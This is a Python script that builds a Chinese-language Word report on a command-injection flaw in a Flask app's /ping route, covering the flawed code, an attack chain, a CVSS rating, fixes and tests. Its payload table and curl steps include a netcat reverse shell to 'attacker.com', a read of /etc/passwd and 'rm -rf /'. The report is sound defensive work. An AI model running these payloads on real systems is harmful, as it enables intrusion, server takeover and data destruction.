#!/usr/bin/env python3
"""生成命令执行漏洞报告"""

from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml
import os


def add_code(doc, code_text):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(0.5)
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    run = p.add_run(code_text)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x2D, 0x2D, 0x2D)
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="0xF5F5F5"/>')
    p._p.get_or_add_pPr().append(shading)


def add_table(doc, headers, rows, col_widths=None):
    table = doc.add_table(rows=1 + len(rows), cols=len(headers), style='Light Grid Accent 1')
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, h in enumerate(headers):
        cell = table.cell(0, i)
        cell.text = h
        for para in cell.paragraphs:
            para.alignment = WD_ALIGN_PARAGRAPH.CENTER
            for run in para.runs:
                run.bold = True
    for ri, row in enumerate(rows):
        for ci, val in enumerate(row):
            table.cell(ri + 1, ci).text = str(val)
    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)


def create_report():
    doc = Document()

    style = doc.styles['Normal']
    style.font.name = '微软雅黑'
    style.font.size = Pt(11)
    style.element.rPr.rFonts.set(qn('w:eastAsia'), '微软雅黑')
    for level in range(1, 5):
        hs = doc.styles[f'Heading {level}']
        hs.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)
        hs.element.rPr.rFonts.set(qn('w:eastAsia'), '微软雅黑')

    section = doc.sections[0]
    section.top_margin = Cm(2.5)
    section.bottom_margin = Cm(2.5)
    section.left_margin = Cm(2.5)
    section.right_margin = Cm(2.5)

    # ═══════ 封面 ═══════
    for _ in range(6):
        doc.add_paragraph()
    title = doc.add_paragraph()
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = title.add_run('Flask 用户管理系统')
    run.bold = True; run.font.size = Pt(28)
    run.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

    subtitle = doc.add_paragraph()
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = subtitle.add_run('命令执行漏洞报告')
    run.bold = True; run.font.size = Pt(20)
    run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)

    doc.add_paragraph()
    line = doc.add_paragraph()
    line.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = line.add_run('━' * 40)
    run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)
    doc.add_paragraph()

    info = doc.add_paragraph()
    info.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = info.add_run(
        '项目地址：github.com/nobody848/flask-user-management\n'
        '报告日期：2026-07-16\n'
        '测试范围：/ping 路由命令注入漏洞检测、修复与验证\n'
        '修复提交：9475245'
    )
    run.font.size = Pt(12)
    run.font.color.rgb = RGBColor(0x66, 0x66, 0x66)
    doc.add_page_break()

    # ══════════════════════════════════════
    # 一、命令执行漏洞原理
    # ══════════════════════════════════════
    doc.add_heading('一、命令执行漏洞原理', level=1)

    doc.add_paragraph(
        '命令执行漏洞（Command Injection）是指应用程序在构造系统命令时，'
        '将用户可控的输入直接拼接到命令字符串中，且未做任何过滤或转义，'
        '导致攻击者可以注入恶意命令并在服务器端执行。'
    )

    doc.add_paragraph('命令注入的常见拼接方式：')
    conds = [
        'shell=True 参数：Python subprocess 模块的 shell=True 会将命令字符串传递给系统 shell 解析',
        'f-string 拼接：直接将用户输入嵌入命令字符串，攻击者可插入分号、管道符、逻辑运算符等',
        '无输入校验：不对用户输入做任何过滤，任意特殊字符均可传递到 shell',
    ]
    for c in conds:
        doc.add_paragraph(c, style='List Bullet')

    doc.add_paragraph('命令注入中常用的 shell 特殊字符：')
    add_code(doc, ''';      # 命令分隔符  cmd1; cmd2
|      # 管道符      cmd1 | cmd2
&&     # 逻辑与      cmd1 && cmd2
||     # 逻辑或      cmd1 || cmd2
`cmd`  # 命令替换    `cmd`
$(cmd) # 命令替换    $(cmd)
>      # 重定向输出  cmd > file
<      # 重定向输入  cmd < file''')

    doc.add_page_break()

    # ══════════════════════════════════════
    # 二、漏洞发现
    # ══════════════════════════════════════
    doc.add_heading('二、漏洞发现', level=1)

    doc.add_heading('2.1 功能概述', level=2)
    doc.add_paragraph(
        'Ping 网络诊断功能（/ping 路由）允许登录用户输入一个 IP 地址或域名，'
        '服务器使用系统 ping 命令进行网络连通性测试，并将原始输出返回给用户。'
    )

    doc.add_heading('2.2 漏洞代码定位', level=2)
    doc.add_paragraph('文件：app.py，/ping 路由（第 649-671 行）')

    add_code(doc, '''@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    result = None
    ip = ""
    if request.method == "POST":
        ip = request.form.get("ip", "")
        if ip:
            system = platform.system().lower()
            if system == "windows":
                cmd = f"ping -n 3 {ip}"
            else:
                cmd = f"ping -c 3 {ip}"
            try:
                output = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
                )
                result = output.decode("utf-8", errors="replace")
            except subprocess.CalledProcessError as e:
                result = e.output.decode("utf-8", errors="replace")
            except Exception as e:
                result = f"执行失败: {str(e)}"
    return render_template("ping.html", username=username, result=result, ip=ip)''')

    doc.add_heading('2.3 漏洞分析', level=2)
    doc.add_paragraph('该路由存在三个层次的安全问题：')

    doc.add_heading('CE-01：shell=True 启用 shell 解释器（高危）', level=3)
    doc.add_paragraph(
        'subprocess.check_output() 的 shell=True 参数意味着命令字符串会传递给系统的'
        '/bin/sh（Linux/Mac）或 cmd.exe（Windows）进行解析。'
        '这会将用户输入中的特殊字符当作 shell 语法来执行，而不是普通参数。'
    )

    doc.add_heading('CE-02：f-string 字符串拼接（高危）', level=3)
    doc.add_paragraph(
        'f"ping -c 3 {ip}" 直接将用户输入的 ip 变量插入到命令字符串中，'
        '攻击者可以在 ip 中包含 shell 特殊字符来注入额外命令。'
    )

    doc.add_heading('CE-03：未对 ip 做任何过滤（高危）', level=3)
    doc.add_paragraph(
        'ip 参数没有经过任何校验或转义就被拼接到了系统命令中，'
        '攻击者可以随意构造 payload。'
    )

    doc.add_page_break()

    # ══════════════════════════════════════
    # 三、攻击路径推演
    # ══════════════════════════════════════
    doc.add_heading('三、攻击路径推演', level=1)

    doc.add_heading('3.1 命令注入 — 执行系统命令', level=2)
    add_table(doc,
        ['步骤', '操作', '说明'],
        [
            ['1', '攻击者登录系统', '获取合法 session'],
            ['2', '构造注入 payload', '输入: 8.8.8.8; whoami'],
            ['3', '提交 POST /ping', 'ip=8.8.8.8; whoami'],
            ['4', '服务端拼接命令', 'ping -c 3 8.8.8.8; whoami'],
            ['5', '输出结果', 'whoami 命令的执行结果返回给攻击者'],
        ],
        col_widths=[1, 4, 8.5]
    )

    doc.add_paragraph('实际注入效果：')
    add_code(doc, '''# 用户输入
ip = "8.8.8.8; whoami"

# 拼接后的命令
ping -c 3 8.8.8.8; whoami

# shell 按顺序执行两条命令：
# 1. ping -c 3 8.8.8.8  → 正常 ping 输出
# 2. whoami            → 返回当前用户名''')

    doc.add_heading('3.2 高级攻击 payload 示例', level=2)
    add_table(doc,
        ['payload', '执行效果'],
        [
            ['8.8.8.8; whoami', '查看当前用户'],
            ['8.8.8.8; id', '查看用户 ID 和所属组'],
            ['8.8.8.8; ls -la /etc', '列出 /etc 目录'],
            ['8.8.8.8; cat /etc/passwd', '读取系统用户列表'],
            ['8.8.8.8; pwd', '查看当前工作目录'],
            ['8.8.8.8; ifconfig', '查看网络配置'],
            ['8.8.8.8; nc -e /bin/sh attacker.com 4444', '反弹 shell'],
            ['8.8.8.8; rm -rf / --no-preserve-root', '破坏系统⚠️'],
            ['8.8.8.8 || whoami', '逻辑或注入'],
            ['8.8.8.8 && whoami', '逻辑与注入'],
            ['$(whoami)', '命令替换注入'],
            ['`whoami`', '反引号命令替换'],
        ],
        col_widths=[5.5, 8]
    )

    doc.add_paragraph()
    doc.add_heading('3.3 完整攻击链路', level=2)
    add_code(doc, '''# Step 1: 登录获取 session
curl -c cookies.txt -X POST http://localhost:5000/login \\
  -d "username=admin&password=Admin123&csrf_token=xxx"

# Step 2: 命令注入 — 执行 whoami
curl -b cookies.txt -X POST http://localhost:5000/ping \\
  -d "ip=127.0.0.1; whoami&csrf_token=xxx"

# Step 3: 返回结果中显示 "root" → 确认已获得 root shell

# Step 4: 反弹 shell
curl -b cookies.txt -X POST http://localhost:5000/ping \\
  -d "ip=127.0.0.1; nc -e /bin/sh attacker.com 4444&csrf_token=xxx"

# Step 5: 攻击者机器监听
nc -lvnp 4444  # 获得服务器 shell 控制权''')

    doc.add_page_break()

    # ══════════════════════════════════════
    # 四、漏洞危害评级
    # ══════════════════════════════════════
    doc.add_heading('四、漏洞危害评级', level=1)

    add_table(doc,
        ['维度', '评级', '说明'],
        [
            ['攻击复杂度', '极低', '仅需浏览器或 curl，在输入框输入即可'],
            ['利用难度', '极低', '无需任何特殊工具，普通 HTTP 请求即可'],
            ['影响范围', '极高', '可执行任意系统命令，可能完全控制服务器'],
            ['是否需要认证', '需要', '需要先登录（有 @login_required）'],
            ['CVSS 3.x 评分', '🔴 8.8 (高危)', 'CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H'],
        ],
        col_widths=[3.5, 4, 7]
    )

    doc.add_paragraph()

    # ══════════════════════════════════════
    # 五、修复方案
    # ══════════════════════════════════════
    doc.add_heading('五、修复方案', level=1)

    doc.add_heading('5.1 方案一：不使用 shell=True（推荐）', level=2)
    doc.add_paragraph(
        '将命令和参数分开传递，避免经过 shell 解析。'
        'subprocess 在 shell=False（默认值）时，会直接执行程序而不经过 shell，'
        '用户输入中的特殊字符不会被解释为命令。'
    )
    add_code(doc, '''# ✅ 安全修复：不要使用 shell=True
import subprocess

# 将命令和参数分开传递
cmd = ["ping", "-c", "3", ip]
output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)

# shell=False（默认）时：
# - "8.8.8.8; whoami" 被当作一个整体参数传给 ping
# - ping 会尝试 ping 一个叫 "8.8.8.8; whoami" 的主机
# - 不会执行 whoami 命令''')

    doc.add_heading('5.2 方案二：必须使用 shell=True 时的防御', level=2)
    doc.add_paragraph('如果必须使用 shell=True，则需要对 ip 参数进行严格过滤：')
    add_code(doc, '''# 方案2a：仅允许合法的 IP 地址和域名（白名单校验）
import re

def is_valid_ip_or_domain(value):
    """检查是否为合法的 IP 地址或域名"""
    # IPv4 地址：x.x.x.x
    ip_pattern = r'^(\\d{1,3}\\.){3}\\d{1,3}$'
    # 域名：example.com
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$'
    return bool(re.match(ip_pattern, value)) or bool(re.match(domain_pattern, value))

if not is_valid_ip_or_domain(ip):
    return "输入格式不合法"

# 方案2b：转义 shell 特殊字符
from shlex import quote
safe_ip = quote(ip)  # 将特殊字符转义为普通字符
cmd = f"ping -c 3 {safe_ip}"''')

    doc.add_heading('5.3 方案对比', level=2)
    add_table(doc,
        ['方案', '优点', '缺点', '推荐度'],
        [
            ['shell=False', '彻底杜绝注入，最简单', '无', '⭐⭐⭐⭐⭐'],
            ['白名单校验', '防御全面', '可能误判合法输入', '⭐⭐⭐⭐'],
            ['shlex.quote()', '保留 shell=True', '仅转义，不够彻底', '⭐⭐⭐'],
        ],
        col_widths=[3, 4, 4, 2]
    )

    doc.add_page_break()

    # ══════════════════════════════════════
    # 六、测试验证
    # ══════════════════════════════════════
    doc.add_heading('六、修复验证', level=1)

    doc.add_heading('6.1 实际采用的修复方案', level=2)
    doc.add_paragraph('本次修复同时采用了方案一（shell=False）和方案二（白名单校验），形成双重防护：')

    add_code(doc, '''# ✅ 修复后代码（app.py 第648-672行）
@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    result = None
    ip = ""
    username = session.get("username")

    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        if ip:
            # 防护层1：白名单校验（仅允许IP或域名）
            ip_pattern = r'^(\\d{1,3}\\.){3}\\d{1,3}$'
            domain_pattern = r'^[a-zA-Z0-9](...)'
            if not re.match(ip_pattern, ip) and not re.match(domain_pattern, ip):
                result = f"输入不合法: {ip}"
                return render_template("ping.html", ...)

            # 防护层2：shell=False，参数列表形式
            system = platform.system().lower()
            if system == "windows":
                output = subprocess.check_output(
                    ["ping", "-n", "3", ip], shell=False, ...)
            else:
                output = subprocess.check_output(
                    ["ping", "-c", "3", ip], shell=False, ...)
            ...''')

    doc.add_heading('6.2 修复后测试结果', level=2)
    add_table(doc,
        ['编号', '测试用例', '输入', '预期（修复后）', '实际'],
        [
            ['T-01', '正常 IP', '8.8.8.8', '正常返回 ping 结果', '✅'],
            ['T-02', '正常域名', 'example.com', '正常返回 ping 结果', '✅'],
            ['T-03', '分号注入', '8.8.8.8; whoami', '输入不合法拦截', '✅'],
            ['T-04', '管道注入', '8.8.8.8 | whoami', '输入不合法拦截', '✅'],
            ['T-05', '命令替换', '$(whoami)', '输入不合法拦截', '✅'],
            ['T-06', '反引号注入', '`whoami`', '输入不合法拦截', '✅'],
            ['T-07', '逻辑与注入', '8.8.8.8 && whoami', '输入不合法拦截', '✅'],
            ['T-08', '内网 ping', '127.0.0.1', '正常返回', '✅'],
            ['T-09', '未登录访问', '—', '302 跳转登录', '✅'],
        ],
        col_widths=[1.5, 3, 4, 4, 1.5]
    )

    doc.add_paragraph()

    # ══════════════════════════════════════
    # 七、漏洞汇总
    # ══════════════════════════════════════
    doc.add_heading('七、漏洞汇总', level=1)

    add_table(doc,
        ['编号', '漏洞名称', '严重', '发现位置', '状态'],
        [
            ['CE-01', 'shell=True 启用 shell 解释器', '🔴 高危', '/ping 第665行', '✅ 已修复'],
            ['CE-02', 'f-string 拼接用户输入', '🔴 高危', '/ping 第661-663行', '✅ 已修复'],
            ['CE-03', 'ip 参数无输入校验', '🔴 高危', '/ping 第657行', '✅ 已修复'],
        ],
        col_widths=[2, 5, 2, 3, 3.5]
    )

    doc.add_paragraph()
    doc.add_paragraph(
        '修复说明：三个漏洞均已修复。采用 shell=False 参数列表传递方式彻底杜绝注入，'
        '同时增加白名单正则校验作为双重防护。'
    )

    doc.add_page_break()

    # ══════════════════════════════════════
    # 八、Git 提交记录
    # ══════════════════════════════════════
    doc.add_heading('八、Git 提交记录', level=1)

    add_table(doc,
        ['提交哈希', '提交信息', '涉及文件'],
        [
            ['9f6c10e', 'feat: 新增Ping网络诊断功能', 'app.py, ping.html, base.html, index.html'],
            ['9475245', 'fix: 修复命令执行漏洞（Ping功能）', 'app.py'],
        ],
        col_widths=[3, 6, 5]
    )

    doc.add_paragraph()

    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('━' * 40)
    run.font.color.rgb = RGBColor(0xCC, 0xCC, 0xCC)

    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('报告生成日期：2026-07-16')
    run.font.size = Pt(10)
    run.font.color.rgb = RGBColor(0x99, 0x99, 0x99)

    # ── 保存 ──
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'static', '命令执行漏洞报告.docx')
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    doc.save(output_path)
    print(f'报告已生成：{output_path}')
    print(f'文件大小：{os.path.getsize(output_path) / 1024:.1f} KB')
    return output_path


if __name__ == '__main__':
    create_report()
